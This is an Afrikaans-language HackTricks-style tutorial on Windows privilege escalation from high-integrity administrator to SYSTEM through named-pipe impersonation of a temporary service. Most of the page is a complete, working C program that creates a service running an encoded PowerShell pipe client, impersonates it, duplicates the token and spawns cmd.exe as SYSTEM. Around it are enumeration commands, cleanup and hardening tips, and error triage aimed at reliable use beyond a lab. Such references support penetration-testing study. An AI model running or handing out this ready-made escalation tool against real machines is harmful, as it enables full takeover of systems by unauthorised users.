# Van High Integrity na SYSTEM met Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Dit is die **administrator/SCM-variant** van named-pipe impersonation: ’n verhoogde proses skep ’n tydelike diens waarvan die child as `SYSTEM` verbind, en verpersoonlik dan daardie kliënt. As die aanvanklike konteks nie dienste kan skep nie, maar `SeImpersonatePrivilege` het, gebruik eerder privileged-service coercion; sien [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) en [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Die skep van die diens vereis toegang tot die SCM en `SERVICE_START`-toegang tot die nuwe diens, terwyl `CreateProcessWithTokenW` `SeImpersonatePrivilege` vereis.<sup>[[2]](#references)[[3]](#references)</sup>

Bevestig vinnig die verwagte aanvanklike konteks:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Kodevloei:**

1. Skep die named-pipe-bediener **voordat** die diens begin word. Wanneer jy wag, hanteer `ConnectNamedPipe` wat `FALSE` teruggee met `ERROR_PIPE_CONNECTED` as sukses: dit beteken die kliënt het die wedloop gewen en tussen `CreateNamedPipe` en `ConnectNamedPipe` gekoppel.<sup>[[4]](#references)</sup>
2. Skep en begin ’n diens wat aan die geskepte pipe sal koppel en iets sal skryf. Die dienskode sal hierdie geënkodeerde PS-kode uitvoer: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Nadat die diens koppel en skryf, roep `ImpersonateNamedPipeClient` aan, maak die gevolglike thread-token oop en dupliseer dit as ’n primêre token.<sup>[[1]](#references)</sup>
4. Gebruik daardie primêre token om `cmd.exe` te spawn.<sup>[[2]](#references)</sup>

Hierdie roete veronderstel dat die caller ’n diens kan skep/begin en oor die voorregte beskik wat deur `CreateProcessWithTokenW` vereis word (gewoonlik `SeImpersonatePrivilege`). Dit is ’n high-integrity-na-SYSTEM-tegniek, nie ’n primitive wat vir ’n arbitrêre gebruiker met lae voorregte beskikbaar is nie.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> As diensskepping of -begin misluk, sein die sample nie die pipe-thread nie en kan dit onbepaald wag. Voeg foutbehandeling en ’n overlapped-pipe-timeout by voordat jy dit buite ’n lab gebruik. Gebruik ook ’n ewekansige pipe-/diensnaam om botsings te vermy.

`ImpersonateNamedPipeClient` neem die konteks aan wat met die **laaste geleesde boodskap** geassosieer word, dus is ’n verbinding alleen onvoldoende: laat die bevoorregte kliënt skryf, verifieer dat `ReadFile` data teruggegee het, en impersonateer eers daarna. Dupliseer die thread se impersonation-token in ’n `TokenPrimary`-token met `SecurityImpersonation`; ’n primêre token is wat die process-creation-API gebruik.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Fouttriage

- `ConnectNamedPipe == FALSE` met `ERROR_PIPE_CONNECTED`: gaan voort; die pipe is reeds gekoppel.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` misluk met `ERROR_CANNOT_IMPERSONATE` (`1368`): bevestig dat die SYSTEM-client werklik data geskryf het en dat `ReadFile` voltooi is. Inspekteer ook die client se aangevraagde impersonation level; clients op identification/anonymous-vlak kan nie volledig ge-impersonate word nie.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` misluk met `ERROR_PRIVILEGE_NOT_HELD` (`1314`): die oorspronklike caller het nie `SeImpersonatePrivilege` nie. Vanuit ’n high-integrity administrator-konteks, gebruik die token-copy-roete wat in [SeImpersonate from High To System](seimpersonate-from-high-to-system.md) gedokumenteer is, of gebruik `CreateProcessAsUserW` terwyl jy SYSTEM impersonate indien die vereiste privileges beskikbaar is.<sup>[[2]](#references)</sup>
- `CreateServiceA` gee `ERROR_SERVICE_EXISTS` (`1073`) terug: verwyder die verouderde `PiperSrv`-inskrywing of randomizeer `PIPESRV`; verwyder altyd die temporary service ná die trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
